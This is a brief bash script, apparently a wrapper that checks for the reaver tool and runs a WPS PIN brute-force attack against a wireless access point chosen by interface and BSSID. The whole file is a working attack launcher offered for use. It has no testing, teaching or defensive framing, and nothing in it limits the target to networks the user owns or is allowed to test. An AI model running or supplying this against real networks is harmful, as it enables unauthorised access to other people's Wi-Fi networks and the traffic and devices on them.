#!/usr/bin/env bash
# Launch a WPS PIN attack using reaver
set -euo pipefail

usage() {
    echo "Usage: $0 <interface> <bssid>"
}

if [[ $# -ne 2 ]]; then
    usage
    exit 1
fi

IFACE="$1"
BSSID="$2"

if ! command -v reaver >/dev/null 2>&1; then
    echo "reaver is required" >&2
    exit 1
fi

reaver -i "$IFACE" -b "$BSSID" -vv
